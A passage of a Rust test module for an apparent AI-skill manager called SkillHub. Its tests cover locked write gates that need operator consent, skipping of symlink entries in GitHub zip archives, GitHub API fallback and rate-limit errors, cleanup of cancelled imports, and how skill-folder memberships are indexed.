        )
        .is_err());

        let audit_events = read_indexed_audit_events(&connection).expect("audit should read");
        assert!(
            audit_events
                .iter()
                .filter(|event| event.event_type == "release_gate_runner")
                .count()
                >= 10
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn write_gates_never_unlock_real_writes_without_explicit_executor() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-write-gate-test-{}",
            unix_timestamp_string()
        ));
        let connection = open_index_database(&root).expect("test sqlite should open");
        let snapshot =
            read_snapshot_from_database(&root, &connection).expect("snapshot should read");

        assert_eq!(snapshot.write_gates.len(), 4);
        assert!(snapshot.write_gates.iter().all(|gate| !gate.unlocked));
        assert!(snapshot
            .write_gates
            .iter()
            .all(|gate| !gate.plan_steps.is_empty()));
        assert!(snapshot
            .write_gates
            .iter()
            .all(|gate| !gate.rollback_steps.is_empty()));
        assert!(snapshot
            .write_gates
            .iter()
            .all(|gate| gate.status == "blocked" || gate.status == "locked"));
        assert!(snapshot.write_gates.iter().any(|gate| {
            gate.id == "agent-sync"
                && gate
                    .blocking_checks
                    .iter()
                    .any(|check| check.contains("AI 工具同步解锁检查报告已生成"))
        }));
        assert!(snapshot.write_gates.iter().any(|gate| {
            gate.id == "agent-sync"
                && gate
                    .blocking_checks
                    .iter()
                    .any(|check| check.contains("真实写入授权开关"))
        }));
        assert!(snapshot.write_gates.iter().any(|gate| {
            gate.id == "release-package"
                && gate
                    .blocking_checks
                    .iter()
                    .any(|check| check.contains("发布打包解锁检查报告已生成"))
        }));
        set_real_write_authorization_in_connection(&connection, true)
            .expect("authorization should save");
        let authorized_snapshot = read_snapshot_from_database(&root, &connection)
            .expect("authorized snapshot should read");
        assert!(authorized_snapshot.operator_consent.real_writes_enabled);
        assert!(authorized_snapshot.write_gates.iter().any(|gate| {
            gate.id == "agent-sync"
                && gate
                    .passing_checks
                    .iter()
                    .any(|check| check.contains("真实写入授权开关"))
        }));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn github_codeload_symlink_entry_is_skipped_without_following_it() {
        use std::io::{Cursor, Write};
        use zip::write::FileOptions;

        let mut bytes = Cursor::new(Vec::new());
        {
            let mut writer = zip::ZipWriter::new(&mut bytes);
            writer
                .start_file(
                    "repository-main/skills/academic-paper",
                    FileOptions::default().unix_permissions(0o777),
                )
                .expect("symlink fixture should start");
            writer
                .write_all(b"../academic-paper")
                .expect("symlink target should write");
            writer.finish().expect("zip fixture should finish");
        }
        // zip 0.6 masks file-type bits in FileOptions. Mark the central-directory
        // record as a Unix symlink so this fixture matches GitHub codeload archives.
        let archive_bytes = bytes.get_mut();
        let central_offset = archive_bytes
            .windows(4)
            .position(|window| window == [0x50, 0x4b, 0x01, 0x02])
            .expect("central directory should exist");
        archive_bytes[central_offset + 5] = 3;
        archive_bytes[central_offset + 38..central_offset + 42]
            .copy_from_slice(&(0o120777u32 << 16).to_le_bytes());
        bytes.set_position(0);
        let mut archive = ZipArchive::new(bytes).expect("zip fixture should open");
        let entry = archive.by_index(0).expect("symlink entry should exist");

        assert_eq!(
            inspect_codeload_archive_entry(&entry).expect("inspection should not reject archive"),
            CodeloadEntryInspection::SkipSymlink(
                "repository-main/skills/academic-paper".to_string()
            )
        );
    }

    #[test]
    fn anonymous_github_api_file_fallback_is_refused_before_blob_requests() {
        let error = ensure_github_api_file_fallback_allowed(false)
            .expect_err("anonymous per-blob fallback must be disabled");
        assert!(error.contains("匿名 GitHub API"));
        assert!(error.contains("GITHUB_TOKEN"));
        assert!(ensure_github_api_file_fallback_allowed(true).is_ok());

        let rate_error = format_github_api_status_error(
            403,
            "Imbad0202",
            "academic-research-skills",
            "0",
            "1786032416",
            "API rate limit exceeded",
        );
        assert!(rate_error.contains("请求额度已用尽"));
        assert!(rate_error.contains("2026-08-06 16:06:56 UTC"));
        assert!(!rate_error.contains("remaining=0"));
    }

    #[test]
    fn cancelled_source_import_cleans_partial_staging_only() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-cancelled-import-test-{}",
            unix_timestamp_string()
        ));
        let staged_path = source_import_staging_root(&root).join("partial-download");
        let formal_path = managed_sources_dir(&root).join("existing-source");
        fs::create_dir_all(&staged_path).expect("staging fixture should create");
        fs::create_dir_all(&formal_path).expect("formal fixture should create");
        fs::write(staged_path.join("partial.zip"), b"partial")
            .expect("partial fixture should write");
        fs::write(formal_path.join("SKILL.md"), b"# Existing")
            .expect("formal fixture should write");

        cleanup_cancelled_source_import(&staged_path)
            .expect("cancelled staging should be recoverably cleaned");

        assert!(!staged_path.exists());
        assert!(formal_path.join("SKILL.md").exists());
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn skill_folder_membership_survives_a_full_index_refresh() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-folder-refresh-test-{}",
            unix_timestamp_string()
        ));
        let skill = test_skill_card("paper-writer", "local", "paper-writer", false);
        let snapshot = test_snapshot(&root, Vec::new(), vec![skill], Vec::new());
        persist_snapshot(&root, &snapshot).expect("initial index should persist");

        let connection = open_index_database(&root).expect("folder database should open");
        connection
            .execute(
                "INSERT INTO skill_folders
                (id, name, note, color, sort_order, created_at, updated_at)
             VALUES ('folder-paper', 'Paper 写作', '论文写作流程', 'violet', 0, '1', '1')",
                [],
            )
            .expect("folder should insert");
        connection
            .execute(
                "INSERT INTO skill_folder_memberships (skill_id, folder_id, sort_order, updated_at)
             VALUES (?1, 'folder-paper', 0, '1')",
                params![stable_id("skill", "paper-writer")],
            )
            .expect("membership should insert");
        drop(connection);

        persist_snapshot(&root, &snapshot).expect("refreshed index should persist");
        let connection = open_index_database(&root).expect("refreshed database should open");
        let skills = read_indexed_skills(&connection).expect("skills should read");
        assert_eq!(skills.len(), 1);
        assert_eq!(skills[0].user_folder_id, "folder-paper");
        assert_eq!(skills[0].user_folder_name, "Paper 写作");
        assert_eq!(skills[0].user_folder_color, "violet");
        let folders = read_indexed_skill_folders(&connection).expect("folders should read");
        assert_eq!(folders[0].skill_count, 1);
        drop(connection);
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn source_skills_can_be_filed_together_without_touching_skill_files() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-source-folder-test-{}",
            unix_timestamp_string()
        ));
        let source_dir = active_sources_dir(&root).join("research-pack");
        fs::create_dir_all(&source_dir).expect("source fixture should create");
        fs::write(source_dir.join("keep.txt"), b"unchanged").expect("source fixture should write");
        let source = test_source_card(
            "source-research-pack",
            "research-pack",
            &source_dir,
            "https://github.com/example/research-pack.git",
        );
        let skills = vec![
            test_skill_card("idea-finder", "research-pack", "idea-finder", false),
            test_skill_card("paper-writer", "research-pack", "paper-writer", false),
        ];
        persist_snapshot(
            &root,
            &test_snapshot(&root, vec![source], skills, Vec::new()),
        )
        .expect("initial index should persist");

        let connection = open_index_database(&root).expect("folder database should open");
        connection
            .execute(
                "INSERT INTO skill_folders
                    (id, name, note, color, sort_order, created_at, updated_at)
                 VALUES ('folder-research', '文献调研', '', 'cyan', 0, '1', '1')",
                [],
            )
            .expect("folder should insert");
        let indexed_source_id: String = connection
            .query_row(
                "SELECT source_id FROM skills WHERE id = ?1",
                params![stable_id("skill", "idea-finder")],
                |row| row.get(0),
            )
            .expect("indexed source should exist");
        let changed =
            update_source_folder_membership(&connection, &indexed_source_id, "folder-research")
                .expect("source tree should be filed together");
        assert_eq!(changed, 1);
        let filed: i64 = connection
            .query_row(
                "SELECT COUNT(*) FROM source_folder_memberships WHERE folder_id = 'folder-research'",
                [],
                |row| row.get(0),
            )
            .expect("memberships should count");
        assert_eq!(filed, 1);
        let materialized_children: i64 = connection
            .query_row("SELECT COUNT(*) FROM skill_folder_memberships", [], |row| {
                row.get(0)
            })
            .expect("legacy child memberships should count");
        assert_eq!(materialized_children, 0);
        let indexed = read_indexed_skills(&connection).expect("filed Skills should read");
        assert_eq!(indexed.len(), 2);
        assert!(indexed
            .iter()
            .all(|skill| skill.user_folder_id == "folder-research"));
        assert_eq!(
            fs::read(source_dir.join("keep.txt")).expect("source file should remain"),
            b"unchanged"
        );
        drop(connection);

        let mut refreshed_skills = vec![
            test_skill_card("idea-finder", "research-pack", "idea-finder", false),
            test_skill_card("paper-writer", "research-pack", "paper-writer", false),
            test_skill_card(
                "citation-checker",
                "research-pack",
                "citation-checker",
                false,
            ),
        ];
        refreshed_skills[2].description = "newly synced child".to_string();
        let refreshed_source = test_source_card(
            "source-research-pack",
            "research-pack",
            &source_dir,
            "https://github.com/example/research-pack.git",
        );
        persist_snapshot(
            &root,
            &test_snapshot(&root, vec![refreshed_source], refreshed_skills, Vec::new()),
        )
        .expect("refreshed source tree should persist");
        let connection = open_index_database(&root).expect("refreshed folder database should open");
        let indexed = read_indexed_skills(&connection).expect("refreshed Skills should read");
        assert_eq!(indexed.len(), 3);
        assert!(indexed
            .iter()
            .all(|skill| skill.user_folder_id == "folder-research"));
        drop(connection);
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn generic_repo_alias_cannot_override_an_exact_source_identity() {
        let mut source_ids = HashMap::new();
        insert_source_id_primary(&mut source_ids, "skills", "source-existing-skills");
        insert_source_id_alias(&mut source_ids, "skills", "source-emilkowalski-skills");
        assert_eq!(
            source_ids.get("skills").map(String::as_str),
            Some("source-existing-skills")
        );
        assert_eq!(
            github_source_storage_name("emilkowalski", "skills"),
            "emilkowalski--skills"
        );
        let root = PathBuf::from("C:\\AI-SkillHub-Test");
        let plan =
            build_github_source_import_plan(&root, &[], "https://github.com/emilkowalski/skills")
                .expect("generic repository plan should build");
        assert!(normalize_path_for_compare(&plan.target_path).ends_with("\\emilkowalski--skills"));
    }

    #[test]
    fn managed_link_diagnostics_ignore_missing_targets_and_keep_valid_skills() {
        let root = std::env::temp_dir().join(format!(
            "skillhub-managed-link-diagnostic-test-{}",
            unix_timestamp_string()
        ));
        let valid_target = root.join("sources").join("valid-parent");
        let missing_target = root.join("sources").join("removed-parent");
        fs::create_dir_all(&valid_target).expect("valid target should be created");
        fs::write(
            valid_target.join("SKILL.md"),
            "---\nname: valid-parent\ndescription: Valid parent.\n---\n",
        )
        .expect("valid manifest should be written");

        let state_dir = private_state_dir(&root).join("sync-state");
        fs::create_dir_all(&state_dir).expect("state directory should be created");
        fs::write(
            state_dir.join("managed-links.json"),
            serde_json::to_vec_pretty(&serde_json::json!([
                {
                    "Skill": "valid-parent",
                    "Repo": "valid-source",
                    "Description": "Valid parent.",
                    "Target": valid_target.to_string_lossy()
                },
                {
                    "Skill": "removed-parent",
                    "Repo": "removed-source",
                    "Description": "Must not become a ghost Skill.",
                    "Target": missing_target.to_string_lossy()
                },
                {
                    "Skill": "blank-target",
                    "Repo": "blank-source",
                    "Target": ""
                }
            ]))
            .expect("managed link state should serialize"),
        )
        .expect("managed link state should be written");

        let mut diagnostics = HashMap::new();
        merge_managed_link_skills(&root, &mut diagnostics);

        let valid = diagnostics
            .get("valid-parent")
            .expect("valid managed Skill should remain in diagnostics");
        assert!(valid.has_skill_md);
        assert_eq!(valid.repo, "valid-source");
        assert_eq!(PathBuf::from(&valid.target), valid_target);
        assert!(!diagnostics.contains_key("removed-parent"));
        assert!(!diagnostics.contains_key("blank-target"));

        let _ = fs::remove_dir_all(root);
    }
}
